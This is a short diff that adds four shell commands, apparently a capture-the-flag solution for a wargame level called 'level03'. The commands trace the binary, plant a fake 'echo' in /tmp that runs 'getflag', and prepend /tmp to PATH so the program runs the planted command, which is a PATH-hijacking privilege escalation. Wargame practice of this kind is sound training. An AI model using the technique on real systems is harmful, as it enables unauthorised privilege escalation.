@@ -1,0 +1,4 @@
+ltrace ./level03
+echo getflag > /tmp/echo && chmod +x /tmp/echo
+export PATH=/tmp:$PATH
+./level03
